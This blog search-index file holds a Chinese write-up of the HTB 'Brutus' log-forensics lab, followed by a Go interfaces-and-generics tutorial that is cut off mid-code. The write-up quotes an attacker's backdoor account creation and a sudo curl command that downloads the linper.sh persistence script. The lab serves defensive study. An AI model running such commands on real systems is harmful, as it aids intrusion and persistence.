<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HTB-Brutus</title>
    <link href="/2025/03/24/HTB-Brutus/"/>
    <url>/2025/03/24/HTB-Brutus/</url>
    
    <content type="html"><![CDATA[<p>Intro to Blue Team </p><p>Level：Very Easy</p><span id="more"></span><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We’ll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.</p><h1 id="Task-1"><a href="#Task-1" class="headerlink" title="Task 1"></a>Task 1</h1><p>打开 <code>auth.log</code> 查看（眼睛要虾了）</p><p><img src="https://img.dkdun.cn/v1/2025/12/75f9080b6ed8d64c.png"></p><p>日志格式</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Timestamp</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">Hostname</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">Service</span>&gt;</span>[<span class="hljs-tag">&lt;<span class="hljs-name">process_id</span>&gt;</span>]: <span class="hljs-tag">&lt;<span class="hljs-name">Message</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在日志中能发现一大段连续的  <code>Failed...</code>  字样的日志</p><p><img src="https://img.dkdun.cn/v1/2025/12/6f0ec98bdd474f43.png"></p><p>这种一般是在爆破了，所以 IP 为：65.2.161.68</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Analyze <span class="hljs-keyword">the</span> auth.<span class="hljs-built_in">log</span>. What is <span class="hljs-keyword">the</span> IP address used <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> attacker <span class="hljs-built_in">to</span> carry out <span class="hljs-keyword">a</span> brute force attack?<br>:<span class="hljs-number">65.2</span><span class="hljs-number">.161</span><span class="hljs-number">.68</span><br></code></pre></td></tr></table></figure><h1 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h1><p>在被爆破之后又在后面看到了登录成功记录</p><p><img src="https://img.dkdun.cn/v1/2025/12/4b5c9bdd99f1fd23.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">The bruteforce attempts were successful <span class="hljs-keyword">and</span> attacker gained <span class="hljs-keyword">access</span> <span class="hljs-keyword">to</span> an account <span class="hljs-keyword">on</span> the <span class="hljs-keyword">server</span>. What <span class="hljs-keyword">is</span> the username <span class="hljs-keyword">of</span> the account?<br>:root<br></code></pre></td></tr></table></figure><h1 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h1><p>读取 <code>wtmp</code> 数据，找到 root 用户登录信息</p><p><img src="https://img.dkdun.cn/v1/2025/12/39b3938228f23bc3.png"></p><p><code>2024-03-06T06:32:45,387923+00:00</code> 也就是 <code>2024-03-06 06:32:45</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Identify the <span class="hljs-type">timestamp</span> <span class="hljs-keyword">when</span> the attacker <span class="hljs-keyword">logged</span> <span class="hljs-keyword">in</span> manually <span class="hljs-keyword">to</span> the <span class="hljs-keyword">server</span> <span class="hljs-keyword">to</span> carry <span class="hljs-keyword">out</span> their objectives. The <span class="hljs-keyword">login</span> <span class="hljs-type">time</span> will be different than the authentication <span class="hljs-type">time</span>, <span class="hljs-keyword">and</span> can be <span class="hljs-built_in">found</span> <span class="hljs-keyword">in</span> the wtmp artifact.<br>:<span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-06</span> <span class="hljs-number">06</span>:<span class="hljs-number">32</span>:<span class="hljs-number">45</span><br></code></pre></td></tr></table></figure><h1 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h1><p>查看和 <code>wtmp</code> 文件中登录时间一样的的，差了一秒钟但这是正常现象，因为验证 <code>/etc/shadow</code> 文件中的哈希和启动交互式会话都需要花费时间，所以答案就是 <code>06:32:44</code> 的信息，创建了 <code>New Session 37</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/b02b710d73dcb1d9.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">SSH <span class="hljs-keyword">login</span> sessions are tracked <span class="hljs-keyword">and</span> assigned a <span class="hljs-keyword">session</span> number upon <span class="hljs-keyword">login</span>. What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">session</span> number assigned <span class="hljs-keyword">to</span> the attacker<span class="hljs-string">&#x27;s session for the user account from Question 2?</span><br><span class="hljs-string">:37</span><br></code></pre></td></tr></table></figure><h1 id="Task-5"><a href="#Task-5" class="headerlink" title="Task 5"></a>Task 5</h1><p>查找新的用户，那说明这个用户成功创建，在日志里发现 <code>cyberjunkie</code> 被添加到了 <code>sudo</code> 组中，并且有对 <code>/etc/shadow</code> 的访问权限</p><p><img src="https://img.dkdun.cn/v1/2025/12/b60aa9c7e4dce85a.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">The attacker added a <span class="hljs-built_in">new</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">as</span> part <span class="hljs-keyword">of</span> their persistence strategy <span class="hljs-keyword">on</span> the <span class="hljs-keyword">server</span> <span class="hljs-keyword">and</span> gave this <span class="hljs-built_in">new</span> <span class="hljs-keyword">user</span> account higher <span class="hljs-keyword">privileges</span>. What <span class="hljs-keyword">is</span> the <span class="hljs-type">name</span> <span class="hljs-keyword">of</span> this account?<br>:cyberjunkie<br></code></pre></td></tr></table></figure><h1 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h1><p><a href="https://attack.mitre.org/techniques/T1136/">MITRE ATT&amp;CK</a></p><p>在网上搜到的：<a href="https://www.freebuf.com/articles/network/359282.html">ATT&amp;CK v10版本战术介绍—持久化（二）</a>，T1136</p><p>从日志来看，应该是使用的本地创建账户，ID 为 <code>T1136.001</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/3b7f63d0c168e49c.png"></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">What is the MITRE ATT&amp;CK<span class="hljs-built_in"> sub-technique </span>ID used for persistence by creating a<span class="hljs-built_in"> new </span>account?<span class="hljs-keyword"></span><br><span class="hljs-keyword">:T1136</span>.001<br></code></pre></td></tr></table></figure><h1 id="Task-7"><a href="#Task-7" class="headerlink" title="Task 7"></a>Task 7</h1><p>可以看到 <code>session</code> 在 <code>06:37:24</code> 结束，所以答案为 <code>2024-03-06 06:37:24</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/c203cf4f5fd6e666.png"></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-built_in">time</span> did <span class="hljs-keyword">the</span> attacker&#x27;s <span class="hljs-keyword">first</span> SSH session <span class="hljs-keyword">end</span> according <span class="hljs-keyword">to</span> auth.<span class="hljs-built_in">log</span>?<br>:<span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-06</span> <span class="hljs-number">06</span>:<span class="hljs-number">37</span>:<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><h1 id="Task-8"><a href="#Task-8" class="headerlink" title="Task 8"></a>Task 8</h1><p>在日志结尾处能发现使用了 <code>curl </code>命令</p><p><img src="https://img.dkdun.cn/v1/2025/12/fa54c61ca2f90664.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/curl https:/</span><span class="hljs-regexp">/raw.githubusercontent.com/m</span>ontysecurity<span class="hljs-regexp">/linper/m</span>ain/linper.sh<br></code></pre></td></tr></table></figure><p>可以看到下载了 <code>linper.sh</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">The</span> attacker logged into their backdoor account <span class="hljs-keyword">and</span> utilized their higher privileges to download a script. <span class="hljs-title class_">What</span> is the full command executed using sudo?<br><span class="hljs-symbol">:/usr/bin/curl</span> <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/raw.githubusercontent.com/montysecurity</span><span class="hljs-regexp">/linper/main</span><span class="hljs-regexp">/linper.sh</span><br></code></pre></td></tr></table></figure><h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><h2 id="auth-log"><a href="#auth-log" class="headerlink" title="auth.log"></a>auth.log</h2><p>Linux 中 <code>/var/log</code> 目录下的文件，记录所有与用户认证相关的日志，比如说 ssh </p><p>像 ssh 登录成功，查找相关日志可以过滤 <code>Accepted password</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password <span class="hljs-keyword">for</span> root from 203.101.190.9 port 42825 ssh2<br></code></pre></td></tr></table></figure><p>ssh 登录失败，相关日志可以过滤 <code>Failed password</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Mar  6 06:31:33 ip-172-31-35-28 sshd[2334]: Failed password <span class="hljs-keyword">for</span> invalid user admin from 65.2.161.68 port 46454 ssh2<br></code></pre></td></tr></table></figure><p>爆破日志可以看是否有一段连续的登录请求</p><p>登录会话开始</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Mar  6 06:18:01 ip-172-31-35-28 CRON[1119]: pam_unix(cron:session): session opened <span class="hljs-keyword">for</span> user confluence(uid=998) by (uid=0)<br></code></pre></td></tr></table></figure><p>登录会话结束</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Mar  6 06:18:01 ip-172-31-35-28 CRON[1118]: pam_unix(cron:session): session closed <span class="hljs-keyword">for</span> user confluence<br></code></pre></td></tr></table></figure><h2 id="wtmp"><a href="#wtmp" class="headerlink" title="wtmp"></a>wtmp</h2><p>详细解释：<a href="https://linuxhandbook.com/utmp-wtmp-btmp/">https://linuxhandbook.com/utmp-wtmp-btmp/</a></p><p>Linux 中 <code>utmp</code> 、<code>wtmp</code>、<code>btmp</code> 文件都用于存储用户的登录信息，但每个文件都不一样，文件存储在 <code>/var/run</code> 和 <code>/var/log</code> 中</p><ul><li><p>utmp：跟踪当前登录的用户，默认由 <code>who</code> 和 <code>w</code> 显示当前登录用户的信息，<code>uptime</code> 记录系统启动时间。</p></li><li><p>wtmp：跟踪每次登录和历史登录系统的用户信息，默认由 <code>last</code> 命令查看。</p></li><li><p>btmp：记录失败的尝试登录信息，默认由 <code>lastb</code> 命令查看。</p></li></ul><p>题目中给出的 <code>wtmp</code> 文件，可以使用命令读取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">utmpdump /var/log/wtmp<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>应急响应</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Re:从零开始的 Go 之旅- 基础(4)</title>
    <link href="/2025/03/23/Go-4/"/>
    <url>/2025/03/23/Go-4/</url>
    
    <content type="html"><![CDATA[<p>…ing</p><span id="more"></span><h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><p>接口只定义而不实现</p><h2 id="接口类型"><a href="#接口类型" class="headerlink" title="接口类型"></a>接口类型</h2><p>Go 中的接口（interface）是一种抽象的类型，interface 是一组方法的集合</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">Basic Interface:只要包含方法集的接口<br>General Interface:只要包含类型集的接口<br></code></pre></td></tr></table></figure><h2 id="接口声明"><a href="#接口声明" class="headerlink" title="接口声明"></a>接口声明</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> 接口类型名 <span class="hljs-keyword">interface</span>&#123;<br>    方法名<span class="hljs-number">1</span>( 参数列表<span class="hljs-number">1</span> ) 返回值列表<span class="hljs-number">1</span><br>    方法名<span class="hljs-number">2</span>( 参数列表<span class="hljs-number">2</span> ) 返回值列表<span class="hljs-number">2</span><br>     …<br>&#125;<br></code></pre></td></tr></table></figure><p>一个简单的例子，定义了 <code>Animal</code> 接口，<code>dog</code>  和 <code>cat</code>  结构体，实现 <code>Say()</code> 方法，实现该接口的实例</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Animal <span class="hljs-keyword">interface</span> &#123;<br>Say()<br>&#125;<br><span class="hljs-keyword">type</span> dog <span class="hljs-keyword">struct</span>&#123;&#125;<br><span class="hljs-keyword">type</span> cat <span class="hljs-keyword">struct</span>&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(d dog)</span></span> Say() &#123;<br>fmt.Println(<span class="hljs-string">&quot;www&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c cat)</span></span> Say() &#123;<br>fmt.Println(<span class="hljs-string">&quot;mmm&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> hay Animal<br>a := cat&#123;&#125;<br>b := dog&#123;&#125;<br>hay = a<br>hay.Say()<br>hay = b<br>hay.Say()<br>&#125;<br><br>&gt;&gt;<br>mmm<br>www<br></code></pre></td></tr></table></figure><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>方法集是接口方法的超集，实现方法不需要 <code>implements</code> 关键字指定实现，只要是实现了一个接口的全部方法，那就是实现了该接口，</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">interface</span> &#123;<br>Say(<span class="hljs-type">string</span>) <span class="hljs-type">string</span><br>Walk(<span class="hljs-type">int</span>)<br>&#125;<br><br><span class="hljs-keyword">type</span> Man <span class="hljs-keyword">interface</span> &#123;<br>Exercise()<br>Person<br>&#125;<br><span class="hljs-keyword">type</span> Number <span class="hljs-type">int</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(n Number)</span></span> Say(s <span class="hljs-type">string</span>) <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;bibibibibi&quot;</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(n Number)</span></span> Walk(i <span class="hljs-type">int</span>) &#123;<br>fmt.Println(<span class="hljs-string">&quot;can not walk&quot;</span>)<br>&#125;<br><br><span class="hljs-keyword">type</span> Func <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(f Func)</span></span> Say(s <span class="hljs-type">string</span>) <span class="hljs-type">string</span> &#123;<br>f()<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;bibibibibi&quot;</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(f Func)</span></span> Walk(i <span class="hljs-type">int</span>) &#123;<br>f()<br>fmt.Println(<span class="hljs-string">&quot;can not walk&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> function Func<br>function = <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;do somthing&quot;</span>)<br>&#125;<br>function()<br>&#125;<br>&gt;&gt;<br>do somthing<br></code></pre></td></tr></table></figure><p>上面这个例子中，<code>Man</code>  方法是 <code>Person</code> 方法的超集，所以 <code>Man</code> 也实现了接口 <code>Person</code>；类型 <code>Number</code> 是 <code>int</code> ，<code>Number</code> 方法也是 <code>Person</code> 的超集。函数类型也能实现接口。</p><h2 id="空接口"><a href="#空接口" class="headerlink" title="空接口"></a>空接口</h2><p>空接口是所有类型集的集合，包含所有类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Any <span class="hljs-keyword">interface</span>&#123;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Any</code> 接口内部没用方法集合，所有类型都是 <code>Any</code> 接口的实现，所有类型的方法都是空集的超集，<code>Any</code> 可以保存任何类型的值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Any <span class="hljs-keyword">interface</span> &#123;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> anything Any<br><br>anything = <span class="hljs-number">1</span><br><span class="hljs-built_in">println</span>(anything)<br>fmt.Println(anything)<br><br>anything = <span class="hljs-string">&quot;sad&quot;</span><br><span class="hljs-built_in">println</span>(anything)<br>fmt.Println(anything)<br><br>anything = <span class="hljs-built_in">complex</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br><span class="hljs-built_in">println</span>(anything)<br>fmt.Println(anything)<br><br>anything = <span class="hljs-number">1.2</span><br><span class="hljs-built_in">println</span>(anything)<br>fmt.Println(anything)<br><br>anything = []<span class="hljs-type">int</span>&#123;&#125;<br><span class="hljs-built_in">println</span>(anything)<br>fmt.Println(anything)<br><br>anything = <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;&#125;<br><span class="hljs-built_in">println</span>(anything)<br>fmt.Println(anything)<br>&#125;<br>&gt;&gt;<br>(<span class="hljs-number">0x9f23e0</span>,<span class="hljs-number">0xa2f968</span>)<br><span class="hljs-number">1</span><br>(<span class="hljs-number">0x9f21a0</span>,<span class="hljs-number">0xa307e0</span>)<br>sad<br>(<span class="hljs-number">0x9f24e0</span>,<span class="hljs-number">0xa307f0</span>)<br>(<span class="hljs-number">1</span>+<span class="hljs-number">2i</span>)<br>(<span class="hljs-number">0x9f2560</span>,<span class="hljs-number">0xa30698</span>)<br><span class="hljs-number">1.2</span><br>(<span class="hljs-number">0x9f1560</span>,<span class="hljs-number">0xc000008030</span>)<br>[]<br>(<span class="hljs-number">0x9f6480</span>,<span class="hljs-number">0xc00001e180</span>)<br><span class="hljs-keyword">map</span>[]<br></code></pre></td></tr></table></figure><p>两种输出结果不一样，接口内部可以看成由<code>(val,type)</code> 组成的元组，在调用方法的时候会调用具体类型的具体值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">interface</span>&#123;&#125;<br></code></pre></td></tr></table></figure><p>一个匿名空接口，表示接收任何类型的值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> any = <span class="hljs-keyword">interface</span>&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a <span class="hljs-keyword">interface</span>&#123;&#125;<br><span class="hljs-keyword">var</span> b <span class="hljs-keyword">interface</span>&#123;&#125;<br>a = <span class="hljs-number">1</span><br>b = <span class="hljs-string">&quot;1&quot;</span><br>fmt.Println(a == b)<br>a = <span class="hljs-number">1</span><br>b = <span class="hljs-number">1</span><br>fmt.Println(a == b)<br>&#125;<br>&gt;&gt;<br><span class="hljs-literal">false</span><br><span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>比较空接口时，先比较底层类型，如果类型不匹配的话则为 <code>false</code>，然后再比较值</p><p>如果底层类型不能比较会 <code>panic</code>，<code>comparable</code> 代表所有可比较类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> comparable <span class="hljs-keyword">interface</span>&#123; comparable &#125;<br></code></pre></td></tr></table></figure><h2 id="值接收实现接口"><a href="#值接收实现接口" class="headerlink" title="值接收实现接口"></a>值接收实现接口</h2><p>值接收者实现接口之后，不管是 dog 结构体还是结构体指针 <code>*dog</code>类 型的变量都可以赋值给该接口变量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Mover <span class="hljs-keyword">interface</span> &#123;<br>move()<br>&#125;<br><span class="hljs-keyword">type</span> dog <span class="hljs-keyword">struct</span>&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(d dog)</span></span> move() &#123;<br>fmt.Println(<span class="hljs-string">&quot;run&quot;</span>)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> x Mover<br><span class="hljs-keyword">var</span> a = dog&#123;&#125;  <span class="hljs-comment">// a 是 dog 类型</span><br>x = a          <span class="hljs-comment">// x 可以接收 dog 类型</span><br><span class="hljs-keyword">var</span> b = &amp;dog&#123;&#125; <span class="hljs-comment">// b 是 *dog 类型</span><br>x = b          <span class="hljs-comment">// x 可以接收 *dog 类型</span><br>x.move()<br>&#125;<br>&gt;&gt;<br>run<br></code></pre></td></tr></table></figure><h2 id="指针接收实现接口"><a href="#指针接收实现接口" class="headerlink" title="指针接收实现接口"></a>指针接收实现接口</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Mover <span class="hljs-keyword">interface</span> &#123;<br>move()<br>&#125;<br><span class="hljs-keyword">type</span> dog <span class="hljs-keyword">struct</span>&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(d *dog)</span></span> move() &#123;<br>fmt.Println(<span class="hljs-string">&quot;run&quot;</span>)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> x Mover<br><span class="hljs-comment">//var a = dog&#123;&#125;  // a 是 dog 类型</span><br><span class="hljs-comment">//x = a          // x 可以接收 dog 类型</span><br><span class="hljs-keyword">var</span> b = &amp;dog&#123;&#125; <span class="hljs-comment">// b 是 *dog 类型</span><br>x = b          <span class="hljs-comment">// x 可以接收 *dog 类型</span><br>x.move()<br>&#125;<br>&gt;&gt;<br>run<br></code></pre></td></tr></table></figure><p>Mover 接口的是 <code>*dog</code> 类型，所以不能给 x 传入 dog 类型的 a，此时 x 只能存储 <code>*dog</code> 类型的值。</p><h1 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Sum</span>[<span class="hljs-title">T</span> <span class="hljs-title">int</span> | <span class="hljs-title">float64</span>]<span class="hljs-params">(a, b T)</span></span> T &#123;<br>   <span class="hljs-keyword">return</span> a + b<br>&#125;<br><br><span class="hljs-comment">//T 是类型形参，取决于传进来的类型</span><br><span class="hljs-comment">//int | float64 构成了类型约束，规定了允许的类型</span><br><span class="hljs-comment">//Sum[int]() 指定 int 类型</span><br></code></pre></td></tr></table></figure><p>显式指明用哪种类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">Sum[<span class="hljs-type">int</span>](<span class="hljs-number">2012</span>, <span class="hljs-number">2022</span>)<br></code></pre></td></tr></table></figure><p>不指定类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">Sum(<span class="hljs-number">1.23</span>,<span class="hljs-number">1.14514</span>)<br></code></pre></td></tr></table></figure><p>泛型切片，类型约束 <code>int | int32 | int64</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> GenercSlice[T <span class="hljs-type">int</span> | <span class="hljs-type">int32</span> | <span class="hljs-type">int64</span>] []T<br></code></pre></td></tr></table></figure><p>不能省略类型实参</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">GenercSlice[<span class="hljs-type">int</span>]&#123;<span 